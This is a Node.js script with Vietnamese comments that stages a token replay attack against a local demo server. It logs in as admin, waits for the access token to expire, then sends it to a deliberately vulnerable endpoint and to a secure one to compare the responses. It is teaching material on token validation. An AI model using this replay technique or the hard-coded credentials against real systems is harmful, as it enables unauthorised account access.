// Đang chạy trên Node 24 nên dùng fetch built-in không cần require.

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function runHackSession() {
    console.log("=================================================");
    console.log("=== BẮT ĐẦU CHƯƠNG TRÌNH SCAN BẢO MẬT (HACKER) ===");
    console.log("=================================================\n");
    
    // 1. Giả vờ user bình thường login thành công
    console.log("[1] (Reconnaissance) - Kẻ xấu đang theo dõi đường truyền nạn nhân bấm Login...");
    let res = await fetch('http://localhost:3000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'password123' })
    });
    
    let tokens = await res.json();
    let accessToken = tokens.accessToken;
    console.log("🔥 Đánh cắp thành công Access Token: " + accessToken.substring(0, 40) + "......");
    console.log("   (Nhưng biết Token này chỉ có vỏn vẹn sinh mệnh 5 giây - 30 giây)");
    
    // 2. Chờ 32s để Token hết hạn, test giả định chèn lén Request cũ
    console.log("\n[2] Máy Hacker chuyển trạng thái ngủ đông 32 GIÂY để chờ... Chắc chắn Token này sẽ thành tro bụi.");
    await delay(32000);
    
    // 3. Tấn công đường mòn yếu (Vulnerable Route)
    console.log("\n[3] (Launch Attack) - Hacker thực hiện REPLAY ATTACK (Gửi lại) bằng Token ĐÃ CHẾT đập vào cổng /vulnerable...");
    console.log("    => Cách gọi: Quăng cái token vừa ăn cướp qua URL để Server lú.");
    
    let vulnRes = await fetch(`http://localhost:3000/api/vulnerable/profile?token=${accessToken}`);
    let vulnData = await vulnRes.json();
    
    console.log("-----------------------------------------");
    console.log("💥 [KẾT QUẢ BỊ HACK]:");
    console.log(vulnData);
    console.log("-----------------------------------------");
    
    console.log("\n[4] HACKER tiếp tục gửi nguyên cái Token bốc mùi đó đập thử vào hệ thống API Chuẩn Bảo mật /secure...");
    
    let secRes = await fetch(`http://localhost:3000/api/secure/profile`, {
        headers: { 'Authorization': `Bearer ${accessToken}` }
    });
    let secData = await secRes.json();
    
    console.log("-----------------------------------------");
    console.log("🛡️ [KẾT QUẢ PHÒNG THỦ THÀNH CÔNG]:");
    console.log(secData);
    console.log("-----------------------------------------");
    
    console.log("\n=== SECURITY SCAN HOÀN TẤT ===");
}

runHackSession().catch(err => {
    console.error("Lỗi kịch bản:", err);
    console.log("\nChú ý: Nếu server chạy trên terminal khác, hãy chắc chắn nó không bị crash!");
});
